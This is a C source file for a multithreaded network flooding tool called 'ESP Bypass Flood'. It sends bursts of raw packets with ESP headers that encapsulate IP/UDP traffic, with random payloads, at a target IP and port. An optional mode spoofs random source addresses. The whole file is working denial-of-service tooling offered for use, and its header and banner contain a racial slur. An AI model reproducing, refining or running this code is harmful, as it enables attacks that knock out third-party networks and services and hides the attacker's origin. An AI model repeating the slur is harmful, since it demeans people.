/*
 * ESP Bypass Flood - Standalone x86/x64
 * by c0re_x64 for 0v.lol // nigga
 * usage: sudo ./esp_bypass <ip> <port> <threads> <duration> [--spoof][--burst N][--size N]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

struct esphdr { uint32_t spi; uint32_t seq; };

struct esp_config {
    char target_ip[32];
    uint16_t target_port;
    uint32_t threads;
    uint32_t duration;
    uint8_t ip_tos; uint16_t ip_ident; uint8_t ip_ttl; uint8_t dont_frag;
    uint16_t sport, dport;
    int data_len, burst;
    uint8_t spoof_src;
    volatile uint8_t running;
    uint64_t total_packets, total_bytes;
};

static struct esp_config config;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
static uint32_t rand_state[4];

static void rand_init(void) {
    rand_state[0] = time(NULL); rand_state[1] = getpid() ^ getppid();
    rand_state[2] = clock(); rand_state[3] = rand_state[2] ^ rand_state[1];
}

static uint32_t rand_next(void) {
    uint32_t t = rand_state[0]; t ^= t << 11; t ^= t >> 8;
    rand_state[0] = rand_state[1]; rand_state[1] = rand_state[2];
    rand_state[2] = rand_state[3]; rand_state[3] ^= rand_state[3] >> 19; rand_state[3] ^= t;
    return rand_state[3];
}

static void rand_bytes(char *b, int n) {
    while (n > 0) { if (n >= 4) { *((uint32_t *)b) = rand_next(); b += 4; n -= 4; } else { *b++ = rand_next() & 0xFF; n--; } }
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    for (; count > 1; count -= 2) sum += *addr++;
    if (count == 1) sum += (char)*addr;
    sum = (sum >> 16) + (sum & 0xFFFF); sum += (sum >> 16);
    return ~sum;
}

static uint16_t checksum_udp(struct iphdr *iph, struct udphdr *udph, uint16_t data_len, int len) {
    const uint16_t *buf = (uint16_t *)udph; uint32_t sum = 0;
    while (len > 1) { sum += *buf++; len -= 2; }
    if (len == 1) sum += *((uint8_t *)buf);
    sum += (iph->saddr >> 16) & 0xFFFF; sum += iph->saddr & 0xFFFF;
    sum += (iph->daddr >> 16) & 0xFFFF; sum += iph->daddr & 0xFFFF;
    sum += htons(IPPROTO_UDP); sum += data_len;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

static uint32_t get_local_ip(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return 0;
    struct sockaddr_in svr = { .sin_family = AF_INET, .sin_addr.s_addr = inet_addr("8.8.8.8"), .sin_port = htons(53) };
    if (connect(s, (struct sockaddr *)&svr, sizeof(svr)) < 0) { close(s); return 0; }
    struct sockaddr_in local; socklen_t len = sizeof(local);
    if (getsockname(s, (struct sockaddr *)&local, &len) < 0) { close(s); return 0; }
    close(s); return local.sin_addr.s_addr;
}

// nigga esp bypass thread
static void* esp_thread(void *arg) {
    int tid = *(int *)arg; free(arg);
    int raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw < 0) { fprintf(stderr, "[%d] raw\n", tid); return NULL; }
    int one = 1;
    setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int sndbuf = 8 * 1024 * 1024;
    setsockopt(raw, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(raw, F_SETFL, O_NONBLOCK | fcntl(raw, F_GETFL, 0));
    uint32_t target = inet_addr(config.target_ip);
    uint32_t local = get_local_ip();
    if (!local) { fprintf(stderr, "[%d] no local ip\n", tid); close(raw); return NULL; }
    int pkt_size = sizeof(struct iphdr) + sizeof(struct esphdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + config.data_len;
    char *packet = malloc(pkt_size);
    if (!packet) { close(raw); return NULL; }
    struct iphdr *iph = (struct iphdr *)packet;
    struct esphdr *esph = (struct esphdr *)(iph + 1);
    struct iphdr *inner = (struct iphdr *)(esph + 1);
    struct udphdr *udph = (struct udphdr *)(inner + 1);
    char *payload = (char *)(udph + 1);
    memset(iph, 0, sizeof(struct iphdr));
    iph->version = 4; iph->ihl = 5; iph->tos = config.ip_tos;
    iph->tot_len = htons(pkt_size); iph->id = htons(config.ip_ident);
    iph->ttl = config.ip_ttl;
    if (config.dont_frag) iph->frag_off = htons(1 << 14);
    iph->protocol = 50;
    iph->saddr = config.spoof_src ? rand_next() : local;
    iph->daddr = target;
    esph->spi = rand_next(); esph->seq = rand_next();
    uint32_t seq_cnt = ntohl(esph->seq);
    memset(inner, 0, sizeof(struct iphdr));
    inner->version = 4; inner->ihl = 5; inner->tos = config.ip_tos;
    inner->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + config.data_len);
    inner->id = htons(~config.ip_ident); inner->ttl = config.ip_ttl;
    inner->protocol = IPPROTO_UDP;
    inner->saddr = config.spoof_src ? rand_next() : local;
    inner->daddr = target;
    memset(udph, 0, sizeof(struct udphdr));
    udph->source = htons((config.sport == 0xFFFF) ? (rand_next() % 60000 + 1024) : config.sport);
    udph->dest = htons((config.dport == 0xFFFF) ? (rand_next() % 60000 + 1024) : config.dport);
    udph->len = htons(sizeof(struct udphdr) + config.data_len);
    if (config.data_len > 0) rand_bytes(payload, config.data_len);
    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_addr.s_addr = target, .sin_port = 0 };
    uint64_t pkts = 0, bytes = 0;
    time_t end = time(NULL) + config.duration;
    printf("[thread %d] started\n", tid);
    while (config.running && time(NULL) < end) {
        if (config.ip_ident == 0xFFFF) {
            uint16_t nid = rand_next() & 0xffff;
            iph->id = htons(nid); inner->id = htons(~nid);
        }
        esph->seq = htonl(++seq_cnt);
        if (config.spoof_src) { iph->saddr = rand_next(); inner->saddr = iph->saddr; }
        if (config.sport == 0xFFFF) udph->source = htons(rand_next() % 60000 + 1024);
        if (config.dport == 0xFFFF) udph->dest = htons(rand_next() % 60000 + 1024);
        if (config.data_len > 0) rand_bytes(payload, config.data_len);
        iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        inner->check = 0; inner->check = checksum_generic((uint16_t *)inner, sizeof(struct iphdr));
        udph->check = 0; udph->check = checksum_udp(inner, udph, udph->len, sizeof(struct udphdr) + config.data_len);
        for (int b = 0; b < config.burst; b++) {
            int sent = sendto(raw, packet, pkt_size, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
            if (sent > 0) { pkts++; bytes += sent; }
        }
    }
    pthread_mutex_lock(&stats_mutex);
    config.total_packets += pkts; config.total_bytes += bytes;
    pthread_mutex_unlock(&stats_mutex);
    printf("[thread %d] stopped %llu %llu\n", tid, (unsigned long long)pkts, (unsigned long long)bytes);
    free(packet); close(raw);
    return NULL;
}

static void sigint_handler(int sig) { (void)sig; config.running = 0; }

int main(int argc, char **argv) {
    if (argc < 5) { printf("esp_bypass <ip> <port> <threads> <duration> [--spoof][--burst N][--size N]\n"); return 1; }
    if (geteuid() != 0) { fprintf(stderr, "root\n"); return 1; }
    memset(&config, 0, sizeof(config));
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_port = atoi(argv[2]); config.threads = atoi(argv[3]); config.duration = atoi(argv[4]);
    config.ip_ident = 0xFFFF; config.ip_ttl = 64; config.dont_frag = 1;
    config.sport = 0xFFFF; config.dport = config.target_port;
    config.data_len = 256; config.burst = 4; config.running = 1;
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--tos") == 0 && i+1 < argc) config.ip_tos = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ttl") == 0 && i+1 < argc) config.ip_ttl = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ident") == 0 && i+1 < argc) config.ip_ident = atoi(argv[++i]);
        else if (strcmp(argv[i], "--df") == 0) config.dont_frag = 1;
        else if (strcmp(argv[i], "--sport") == 0 && i+1 < argc) config.sport = atoi(argv[++i]);
        else if (strcmp(argv[i], "--dport") == 0 && i+1 < argc) config.dport = atoi(argv[++i]);
        else if (strcmp(argv[i], "--size") == 0 && i+1 < argc) config.data_len = atoi(argv[++i]);
        else if (strcmp(argv[i], "--burst") == 0 && i+1 < argc) config.burst = atoi(argv[++i]);
        else if (strcmp(argv[i], "--spoof") == 0) config.spoof_src = 1;
    }
    if (config.data_len > 1024) config.data_len = 1024;
    if (config.threads < 1 || config.threads > 256 || config.duration < 1) return 1;
    rand_init();
    signal(SIGINT, sigint_handler); signal(SIGTERM, sigint_handler);
    printf("\n  _____ ____  ____  \n");
    printf(" | ____/ ___||  _ \\ \n");
    printf(" |  _| \\___ \\| |_) |\n");
    printf(" | |___ ___) |  __/ \n");
    printf(" |_____|____/|_|    \n");
    printf(" ESP Bypass - by c0re_x64 for 0v.lol // nigga\n\n");
    pthread_t *threads = malloc(config.threads * sizeof(pthread_t));
    if (!threads) return 1;
    for (uint32_t i = 0; i < config.threads; i++) {
        int *p = malloc(sizeof(int)); *p = i + 1;
        pthread_create(&threads[i], NULL, esp_thread, p);
        usleep(100000);
    }
    for (uint32_t i = 0; i < config.threads; i++) pthread_join(threads[i], NULL);
    free(threads);
    printf("\n[*] done %llu %llu\n", (unsigned long long)config.total_packets, (unsigned long long)config.total_bytes);
    return 0;
}
